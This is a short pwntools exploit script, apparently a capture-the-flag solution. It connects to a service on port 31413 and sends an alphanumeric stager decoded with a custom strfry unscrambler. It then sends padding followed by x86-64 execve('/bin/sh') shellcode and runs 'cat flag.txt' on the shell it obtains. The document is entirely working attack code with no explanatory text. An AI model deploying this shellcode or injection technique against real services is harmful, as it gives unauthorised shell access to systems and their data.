from pwn import pause, remote, args
from strfry import unstrfry

host = args.HOST or 'localhost'
port = args.PORT or 31413

read = 'P^H5@@@@H5y@@@PYhJG@@X5EB@@P_19h0000X50400PZh0000X50000P_'
r = remote(host, port)
r.recvuntil(b'New England special!\n')
r.send(unstrfry(read, pid=1).encode())
r.recvuntil(b'yummy!\n')

shellcode = b'A' * 0x3b + b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.send(shellcode)
pause(1)

r.sendline(b'cat flag.txt; exit')
r.stream()
